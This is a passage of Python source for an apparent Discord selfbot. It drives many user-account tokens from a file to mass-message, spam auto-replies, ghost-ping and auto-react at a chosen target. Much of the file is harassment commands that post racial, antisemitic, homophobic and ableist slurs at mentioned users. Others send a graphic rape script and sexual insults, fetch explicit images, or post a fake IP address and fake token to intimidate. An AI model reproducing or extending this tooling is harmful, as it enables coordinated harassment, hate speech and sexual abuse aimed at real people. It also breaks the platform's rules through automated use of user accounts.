    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        user_react_dict[position - 1] = user_id  # Set user ID to ping for the specified token
        await ctx.send(f"Will ping user <@{user_id}> at the end of messages sent by token at position {position}.")
    else:
        await ctx.send("Invalid position! Please provide a position between 1 and the number of tokens.")
@bot.command()
async def mpa(ctx, user_id: int):
    """Set all tokens to ping the specified user ID."""
    for position in range(len(send_messages)):
        token = get_token_by_position(position)  # Adjusted for 1-based index
        if token:
            user_react_dict[position] = user_id  # Set user ID to ping for all tokens
    await ctx.send(f"All tokens will now ping user <@{user_id}> at the end of messages.")


@bot.command()
async def mma(ctx, mode: int):
    """Change the mode for all tokens."""
    global current_modes
    if mode in range(1, 8):  # Ensure the mode is between 1 and 7
        for position in range(len(current_modes)):  # Iterate through all tokens
            current_modes[position] = mode  # Set the mode for each token
        await ctx.send(f"All tokens have been set to mode {mode}.")
    else:
        await ctx.send("Invalid mode! Please enter a mode between 1 and 7.")  
@bot.command()
async def mm(ctx, position: int, mode: int):
    """Change the mode of the token at the specified position."""
    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        if 1 <= mode <= 7:  # Ensure the mode is between 1 and 7
            current_modes[position - 1] = mode  # Adjust for 1-based index
            await ctx.send(f"Mode for token at position {position} changed to {mode}.")
        else:
            await ctx.send("Invalid mode! Please enter a mode between 1 and 7.")
    else:
        await ctx.send("Invalid position! Please provide a position between 1 and the number of tokens.")        
@bot.command()
async def m(ctx, channel_id: int, position: int):
    """Start sending messages using the token at the specified position in the given channel."""
    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        channel = await bot.fetch_channel(channel_id)  # Fetch the channel by ID
        send_messages[position - 1] = True  # Enable message sending for the specified token
        message_count[position - 1] = 0  # Reset message count for this token
        current_modes[position - 1] = 1  # Default to mode 1 for this token

        client = MessageBot(token, channel_id, position - 1)
        await client.start(token, bot=False)
    else:
        await ctx.send(f"No token found at position {position}.")      
@bot.command()
async def me(ctx, position: int):
    """Stop sending messages using the token at the specified position."""
    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        send_messages[position - 1] = False  # Stop message sending for the specified token
        await ctx.send(f"Stopped sending messages for token at position {position}.")
    else:
        await ctx.send("Invalid position! Please provide a position between 1 and the number of tokens.")       

@bot.command()
async def cap(ctx):
    global auto_capitalism
    await ctx.message.delete()
    auto_capitalism = not auto_capitalism
    await ctx.send(f'Auto capitalism is now {"on" if auto_capitalism else "off"}.', delete_after=5) 
    
@bot.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"exeter_tweet.png"))
            except:
                await ctx.send(res['message'])  
                    
@bot.command()
async def retard(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% retarded. good luck with life with a extra chromosone 😭")

active_clients_1 = {}
current_mode_1 = {}
user_to_reply = {}
replying = {}
last_message_time = {}
mode_6_active = {}
last_mode_6_response_time = {}

class AutoReplyClient(discord.Client):
    def __init__(self, token, user_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.user_id = user_id
        self.running = True

    async def on_ready(self):
        print(f'Logged in as {self.user}')

    async def on_message(self, message):
        if message.author.id == self.user_id and not message.author.bot:  # Check if the message is from the user to reply to
            current_time = time.time()
            reply_mode = current_mode_1.get(self.token, 1)  # Default to mode 1 if not set

            # Mode 6 Logic
            if mode_6_active.get(self.token, False):
                # Only respond if 1.5 seconds have passed since the last response to this user
                if message.author.id not in last_mode_6_response_time or (current_time - last_mode_6_response_time[message.author.id] > 1.5):
                    last_mode_6_response_time[message.author.id] = current_time  # Update the last response time
                    await asyncio.sleep(1.5)  # Simulate typing
                    reply_text = random.choice(load_jokes())  # Choose a joke to reply with
                    await message.reply(reply_text)  # Direct reply
                    return  # Exit to prevent processing further messages

            # Update last message time for other modes
            last_message_time[message.id] = current_time

            if reply_mode == 1:
                reply_text = random.choice(load_jokes())  # Normal reply
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 2:
                joke = random.choice(load_jokes())
                reply_text = "\n" * 100  # 100 empty lines
                reply_text = reply_text.join(joke.split())  # Insert 100 empty lines between words
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 3:
                reply_text = "\n".join([f"# {word.strip() * 100}" for word in random.choice(load_jokes()).split()])  # Bold reply
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 4:
                reply_text = random.choice(load_jokes())  # Just send the joke normally
                await asyncio.sleep(1.5)  # Simulate typing
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 5:
                reply_text = random.choice(load_jokes())  # Send a joke with a ping
                await message.channel.send(f"{reply_text} {message.author.mention}")  # Send with a ping

    def stop_replying(self):
        self.running = False

def load_jokes():
    # Load jokes from jokes.txt
    with open("jokes.txt", "r") as f:
        return f.read().splitlines()  # Return the jokes as a list

@bot.command()
async def ar(ctx, user_id: int, position: int):
    global active_clients_1, current_mode_1, replying

    # Read tokens from tokens2.txt
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Check if the position is valid
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Get the specified token
    token = tokens[position - 1]  # Adjust for zero-based index

    # Stop any existing client for this token if it's already running
    if token in active_clients_1:
        active_clients_1[token].stop_replying()
        await active_clients_1[token].close()

    # Start the AutoReplyClient for the specified token
    client = AutoReplyClient(token, user_id)
    active_clients_1[token] = client  # Keep track of the active client
    current_mode_1[token] = 1  # Default mode to 1
    user_to_reply[token] = user_id  # Set the user ID to reply to
    replying[token] = True  # Mark as replying
    await client.start(token, bot=False)  # Start the client
    await ctx.send(f'Started auto replying to user <@{user_id}> using token at position {position}.')

@bot.command()
async def are(ctx, position: int):
    global active_clients_1

    # Read tokens from tokens2.txt to maintain the original token order
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Check if the position is valid
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Get the specified token
    token = tokens[position - 1]  # Get the token at the specified position

    # Stop the active client for the specified token
    if token in active_clients_1:
        active_clients_1[token].stop_replying()
        await active_clients_1[token].close()
        del active_clients_1[token]  # Remove from active clients
        await ctx.send(f'Stopped auto replying for token at position {position}.')
    else:
        await ctx.send("No active client found for this token.")

@bot.command()
async def am(ctx, position: int, mode: int):
    global active_clients_1, current_mode_1

    # Read tokens from tokens2.txt to maintain the original token order
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Check if the position is valid
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Get the specified token
    token = tokens[position - 1]  # Get the token at the specified position

    # Check if the token is active
    if token in active_clients_1:
        current_mode_1[token] = mode  # Set the new mode for the specified token
        await ctx.send(f'Changed mode for token at position {position} to {mode}.')
    else:
        await ctx.send("No active client found for this token.")


@bot.command()
async def ara(ctx, user_id: int):
    global active_clients_1

    # Read tokens from tokens2.txt
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # List to hold all the client tasks
    client_tasks = []

    # Log in with every token and start responding to the specified user
    for token in tokens:
        if token not in active_clients_1:  # Check if the client is already running for this token
            client = AutoReplyClient(token, user_id)  # Create a new client instance for auto-replies
            active_clients_1[token] = client  # Keep track of the active client
            client_tasks.append(client.start(token, bot=False))  # Add the start task to the list
        else:
            active_clients_1[token].replying = True  # Ensure it's set to reply

    # Wait for all client tasks to complete
    await asyncio.gather(*client_tasks)

    await ctx.send(f'All tokens are now replying to <@{user_id}>.')
@bot.command()
async def arae(ctx):
    global active_clients_1

    # Stop all active clients
    for token in list(active_clients_1.keys()):
        active_clients_1[token].stop_replying()
        await active_clients_1[token].close()
    active_clients_1.clear()  # Clear the active clients list
    await ctx.send("Stopped auto replying for all tokens.")

@bot.command()
async def ama(ctx, mode: int):
    global active_clients_1

    # Check if the provided mode is valid (you can customize the range based on your modes)
    if mode < 1 or mode > 5:  # Assuming you have 5 modes
        await ctx.send("Invalid mode. Please provide a mode between 1 and 5.")
        return

    # Update the mode for each active client
    for token, client in active_clients_1.items():
        client.reply_mode = mode  # Set the mode for the token's client

    await ctx.send(f'All tokens have been set to mode {mode}.')








user_react_dict = {}
active_clients_x = {}


def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file and return them as a list."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

def get_token_by_position(position):
    """Retrieve a token by its position from the tokens list."""
    tokens = read_tokens()
    if 0 <= position < len(tokens):
        return tokens[position]
    return None

class MultiToken3(discord.Client):
    def __init__(self, token, user_id, emoji, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.user_id = user_id
        self.emoji = emoji
        self.position = position

    async def on_ready(self):
        print(f'Logged in as {self.user} using token {self.token[-4:]}.')

    async def on_message(self, message):
        if message.author.id == self.user_id:
            try:
                await message.add_reaction(self.emoji)
            except discord.Forbidden:
                print(f"Missing permissions to react to messages.")
            except discord.HTTPException as e:
                print(f"Failed to add reaction: {e}")

    async def close(self):
        await super().close()
        active_clients_x.pop(self.position, None)  # Remove client from active_clients_x    


@bot.command()
async def rape(ctx, user: discord.User):
    await ctx.message.delete()
    await ctx.send(f"Hey cutie kitten {user.mention}")  
    await ctx.send('my dearest kitten')
    await ctx.send('you have been running from ur daddy for too long.')
    await ctx.send('*slowly whips large meat out*')
    await ctx.send('get down on ur little knees my princess, daddy is mad.')
    await ctx.send('shhhh *puts fingers in mouth*')
    await ctx.send('*slowly pulls kittens pants down*')
    await ctx.send('are u ready for this big load my kitten?')
    await ctx.send('*puts fingers inside kittens tight little pussy')
    await ctx.send('mmm u like that right?')
    await ctx.send('moan for ur daddy')
    await ctx.send('good little princess')
    await ctx.send('*puts dick inside kittens ass*')
    await ctx.send('oops wrong hole i guess ill just keep it in there')
    await ctx.send('*keeps going while fingering kittens tight pussy*')
    await ctx.send('oh yeaa cum for your daddy')
    await ctx.send('wdym no? ARE U DISOBEYING DADDY?')
    await ctx.send('*starts pounding harder and rougher*')
    await ctx.send('yea thats what u get')
    await ctx.send('*sees blood coming out*')
    await ctx.send('good little kitten thats what u get')
    await ctx.send('*pulls out and licks the blood off the ass*')
    await ctx.send('mmmmm yea squirm for daddy')
    await ctx.send('*sticks bloody dick in kittens pussy*')
    await ctx.send('mmmmhmmm yea how does my little kitten like that')
    await ctx.send('*cum for daddy right now ugly little slut*')
    await ctx.send('did u just say no? are u disobeying me again... ykw?')
    await ctx.send('*for disobeying me fucks harder*')
    await ctx.send('beg me to stop fucking u harder')
    await ctx.send('*cums in that smooth pussy*')

@bot.command()
async def cuck(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed cuck command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% cuck!")

@bot.command()
async def pp(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed pp command.", ctx.channel)
        if user == bot.user:
            pp_length = "=" * random.randint(15, 20)
        else:
            pp_length = "=" * random.randint(3, 15)
        await ctx.send(f"{user.mention} pp results = 8{pp_length}>")
        
@bot.command()
async def gay(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed gay command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% gay!")
        
@bot.command()
async def cum(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed cum command.", ctx.channel)
        await ctx.send(f"{user.mention}, i cummed on u ;p")
        
@bot.command()
async def seed(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed seed command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% my seed!")
        
@bot.command()
async def femboy(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed femboy command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% femboy!")
        
@bot.command()
async def aura(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed aura command.", ctx.channel)
        aura_value = random.randint(1, 1000000)
        await ctx.send(f"{user.mention} has {aura_value} aura!")
client = discord.Client()

@bot.command()
async def bangmom(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await bangmom_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def bangmom_user(channel, user):
    try:
        await channel.send(f"LOL IM FUCKING {user.mention}'S MOTHER LOL HER PUSSY IS AMAZING")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} HER PUSSY IS SO GOOD OH MYY")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **I SMACKED THE SHIT OUT OF HER ASS** 😈")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **MADE HER PUSSY SLOPPY**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **GET SAD I DONT CARE BITCH*")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **FUCKIN HELL SHE LASTED A LONG TIME**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **IM UR STEP-DAD NOW CALL ME DADDY FUCK**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **IM UR GOD**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **UR MY SLAVE NOW**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **SHITTY FUCK LOL**")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@bot.command()
async def ip(ctx, user: discord.User):
    random_ip = '.'.join(str(random.randint(1, 192)) for _ in range(4))
    await ctx.send(f'{user.mention} **IP is** {random_ip}')
    
@bot.command()
async def spit(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await spit_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def spit_user(channel, user):
    try:
        await channel.send(f"Let me spit on this cuck named {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"*Spits on* {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"Fuck up you little slut {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"*Spits on again and* {user.mention} *again* 💦")
        await asyncio.sleep(1)
        await channel.send(f"Smelly retard got spat on now suck it u fucking loser {user.mention} 💦")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@bot.command()
async def stomp(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await stomp_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def stomp_user(channel, user):
    try:
        await channel.send(f"Lemme stomp on this nigga named {user.mention} LMFAO")
        await asyncio.sleep(1)
        await channel.send(f"*Stomps on* U tran fuck LMFAO {user.mention} :foot: ")
        await asyncio.sleep(1)
        await channel.send(f"come get stomped on again {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"*Stomps on again* {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"ur my whore bitch {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"*Stomped on once again* {user.mention}... :smiling_imp:")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@bot.command()
async def sigma(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% sigma")


@bot.command()
async def smelly(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% smelly god u smell u fag idc if its 0% u still smell")

@bot.command()
async def roadman(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% a real london uk roadman!")


@bot.command()
async def robloxian(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a robloxian. just like sordo!!")

@bot.command()
async def thug(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% of thugness. ew..")

@bot.command()
async def dahoodian(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a dahoodian. just like sordo!!")
@bot.command()
async def skibidi(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% brainrot. get a job jew u skibidi toiler watcher fuck LMFAO ")

@bot.command()
async def eboy(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a Eboy ur lonely nigga get a job")

@bot.command()
async def egirl(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a egirl, you slut LMFAO")

@bot.command()
async def indian(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a indian... :flag_in: ")

@bot.command()
async def autism(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% Autism")

@bot.command()
async def rizz(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% rizz. dont believe this shit. if its high it's lying u got 0% rizz fuck ass nigga.")

@bot.command()
async def comboy(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a Comboy u weird ass nigga kys")
    
emoji_cycle_running = {}

@bot.command()
async def cemoji(ctx, user: discord.User, *emojis):
    if not emojis:
        await ctx.send("```Please provide at least one emoji to cycle through```")
        return
    
    def check(message):
        return message.author.id == user.id
    
    await ctx.send(f"```Reacting to {user}'s messages with {', '.join(emojis)} in sequence```")
    
    emoji_cycle = iter(emojis)  
    emoji_cycle_running[user.id] = True  
    
    try:
        while emoji_cycle_running.get(user.id, False):  
            msg = await bot.wait_for("message", check=check, timeout=None)             
            try:
                emoji = next(emoji_cycle)
            except StopIteration:
                emoji_cycle = iter(emojis)
                emoji = next(emoji_cycle)
            
            await msg.add_reaction(emoji)
    except Exception as e:
        await ctx.send(f"Error: {e}")
    finally:
        emoji_cycle_running[user.id] = False
        
        
@bot.command()
async def cee(ctx, user: discord.User):
    """Stop the emoji cycle for a specific user."""
    if user.id in emoji_cycle_running and emoji_cycle_running[user.id]:
        emoji_cycle_running[user.id] = False
        await ctx.send(f"```Stopped the emoji cycle for {user.name}```")
    else:
        await ctx.send(f"```No emoji cycle found for {user.name}```")
@bot.command()
async def ghostspam(ctx, count: int, user: discord.User):
    await ctx.message.delete()
    async def send():
        message = await ctx.send(f"<@{user.id}>")
        await message.delete()
        time.sleep(1)
    for i in range(count):
        await send()
        
@bot.command()
async def tickle(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@bot.command()
async def feed(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em) 
 
@bot.command()
async def bomber(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% arabic. Bomber FUCK. LMFAO, keep bombing those towers for Osama bin Laden..")




    
@bot.command()
async def black(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% black! 🤢")
    
@bot.command()
async def jew(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% jewish.")
       

#Display a fox
@bot.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r["image"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_fox.png"))
    except:
        await ctx.send(link)
        
#Display a bird
@bot.command()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_bird.png"))
    except:
        await ctx.send(link)
        
#Display a dog
@bot.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_dog.png"))
    except:
        await ctx.send(link)

#Display a cat
@bot.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_cat.png"))
    except:
        await ctx.send(link)

#Display a Sad Cat
@bot.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_sadcat.png"))
    except:
        await ctx.send(link)
        
        
#Distort image
@bot.command(aliases=["distort"])
async def magik(ctx, user: discord.User=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_magik.png"))
        except:
            await ctx.send(res['message'])

#Deepfry image
@bot.command(aliases=["deepfry"])
async def fry(ctx, user: discord.User=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_fry.png"))
        except:
            await ctx.send(res['message'])

#Blurp image
@bot.command(aliases=["blurp"])
async def blurpify(ctx, user: discord.User=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_blurpify.png"))
        except:
            await ctx.send(res['message'])
            
import string

 #Gen a Fake token
@bot.command()
async def gentoken(ctx, user: discord.Member=None):
    await ctx.message.delete()
    code = "ODA"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    if user is None:
        await ctx.send(''.join(code))
        return
    await ctx.send(user.mention + " token is: " + "".join(code))
    
    
@bot.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@bot.command()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
        
@bot.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@bot.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@bot.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@bot.command()
async def monkey(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% monkey\nBoy is iShowSpeed's son 😂✌️")
    
    
# Lock Command
@bot.command(name="lock", aliases= ["l"])
@commands.has_permissions(manage_channels=True)
async def lock(ctx):
    try:
        # React with a lock emoji
        await ctx.message.add_reaction("🔒")
        
        # Update channel permissions to lock it
        overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    except Exception as e:
        await ctx.send(f"❌ Failed to lock the channel: {e}")

# Unlock Command
@bot.command(name="unlock", aliases= ["ul"])
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
    try:
        # React with an unlock emoji
        await ctx.message.add_reaction("🔓")
        
        # Update channel permissions to unlock it
        overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = True
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    except Exception as e:
        await ctx.send(f"❌ Failed to unlock the channel: {e}")


@bot.command()
async def autoreact(ctx, user: discord.User, emoji: str):
    autoreact_users[user.id] = emoji
    await ctx.send(f"```Now auto-reacting with {emoji} to {user.name}'s messages```")

@bot.command()
async def autoreactoff(ctx, user: discord.User):
    if user.id in autoreact_users:
        del autoreact_users[user.id]
        await ctx.send(f"```Stopped auto-reacting to {user.name}'s messages```")
    else:
        await ctx.send("```This user doesn't have autoreact enabled```")

# Initialize status trackers
ap_status = {}
ak_status = {}

# Core message functions
def load_messages(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        open(filename, 'w', encoding='utf-8').close()
        return []
    except Exception as e:
        print(f"Error loading {filename}: {e}")
        return []

def save_message(filename, message):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{message}\n")
    except Exception as e:
